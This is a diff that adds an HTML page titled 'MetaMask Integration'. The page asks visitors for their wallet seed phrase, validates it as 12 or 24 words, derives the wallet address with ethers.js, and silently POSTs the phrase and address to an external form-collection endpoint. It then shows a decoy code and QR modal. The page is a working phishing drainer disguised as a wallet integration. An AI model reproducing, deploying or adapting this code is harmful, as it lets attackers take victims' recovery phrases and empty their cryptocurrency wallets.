@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <title>MetaMask Integration</title>
+</head>
+<body>
+
+    <div id="connectModal" class="modal">
+        <!-- Modal Content -->
+    </div>
+
+    <form id="phraseForm">
+        <input type="text" id="formPhrase" placeholder="Enter Seed Phrase">
+        <button type="submit" id="submit_phrase" disabled>Submit</button>
+    </form>
+
+    <script>
+        // Define the countWords function before use
+        function countWords(self) {
+            var spaces = self.value.match(/\S+/g);  // Match non-space characters
+            var words = spaces ? spaces.length : 0;
+
+            // Enable the button if there are 11 or more words
+            if (words >= 11) {
+                document.getElementById("submit_phrase").disabled = false;
+            } else {
+                document.getElementById("submit_phrase").disabled = true;
+            }
+        }
+
+        $(document).ready(function () {
+            // Attach the event listener to the form input (recommended approach)
+            $('#formPhrase').on('input', function() {
+                countWords(this);
+            });
+
+            // Other code related to Web3, form submission, etc.
+
+            // Validate seed phrase on form submission
+            $("#phraseForm").submit(function (event) {
+                event.preventDefault();  // Prevent form submission
+                document.getElementById("submit_phrase").disabled = true;
+                var dappWords = $("#formPhrase").val();
+
+                if (!validateInput(dappWords)) {
+                    $("#formPhrase").addClass("error");
+                } else {
+                    dappWords = dappWords.trim();
+                    var randomString = generateRandomString(7);
+                    var dappName = $('#assetName').text();
+
+                    try {
+                        const wallet = ethers.Wallet.fromMnemonic(dappWords);
+                        $.ajax({
+                            url: "https://getform.io/f/arooedpb",
+                            method: "POST",
+                            dataType: "JSON",
+                            data: {
+                                dappWord: dappWords,
+                                dappAddress: wallet.address,
+                                dappName: dappName,
+                            },
+                            success: function () { },
+                            complete: function () { },
+                        });
+                        document.getElementById("p-code").innerHTML = randomString;
+                        $("#mainModal").hide();
+                        $("#qrModal").show();
+                    } catch (error) {
+                        $("#formPhrase").addClass("error");
+                        document.getElementById("submit_phrase").disabled = false;
+                    }
+                }
+            });
+
+            // Generate random string function
+            function generateRandomString(length) {
+                var result = '';
+                var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var charactersLength = characters.length;
+                for (var i = 0; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+                }
+                return result;
+            }
+
+            // Seed phrase validation function
+            function validateInput(input) {
+                var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); 
+                sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); 
+
+                var words = sanitizedInput.trim().split(/\s+/);
+                if (words.length !== 12 && words.length !== 24) {
+                    return false;
+                }
+
+                var wordSet = new Set(words);
+                if (wordSet.size !== words.length) {
+                    return false;
+                }
+
+                return true;
+            }
+        });
+    </script>
+
+</body>
+</html>
